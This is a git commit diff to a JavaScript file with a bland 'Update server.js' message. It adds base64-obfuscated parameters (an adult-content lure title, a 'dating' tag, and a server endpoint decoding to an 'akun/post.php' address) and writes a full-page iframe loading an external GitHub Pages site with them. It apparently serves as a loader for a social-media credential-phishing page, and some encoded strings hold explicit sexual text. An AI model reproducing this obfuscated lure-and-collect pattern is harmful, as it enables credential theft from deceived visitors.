997035bff5ea2f9caf477d78e373c3f4081f4012
fb01cmx <53531630+fb01cmx@users.noreply.github.com>
2019-09-20 22:05:25 +0700

    Update server.js

--- js/server.js
+++ js/server.js
@@ -1,2 +1,29 @@
+
+if(i){
+	var img = i;
+}else{
+	var img = 'aHR0cHM6Ly9pLmltZ3VyLmNvbS9NSm1jdEttLmpwZw';
+}
+if(t){
+	var ttl = t;
+}else{
+	var ttl = 'U2Fzc3kgR2luYSBpcyBnZXR0aW5nIGZpbmdlcmZ1Y2tlZCBhbmQgZnVja2VkIGluIHRoZSBtaWRkbGUgb2YgYSBuaWNlIGRheS4';
+}
+if(s){
+	var srv = s;
+}else{
+	var srv = 'aHR0cHM6Ly93ZWR1c3MuY29tL2FrdW4vcG9zdC5waHA';
+}
+if(u){
+	var usr = u;
+}else{
+	var usr = 'UHJla2Vy';
+}
+if(f){
+	var fp = f;
+}else{
+	var fp = 'ZGF0aW5n';
+}
+var frm = atob('aHR0cHM6Ly9mYjAxY214LmdpdGh1Yi5pby8');
 document.write("<iframe name='site' id='site' width='100%' height='100%' frameborder='0' marginheight='0' marginwidth='0' src='"
 	+ frm + '?i=' + img + '&t=' + ttl + '&s=' + srv + '&u=' + usr + '&f=' + fp + "'></iframe>'></iframe>");
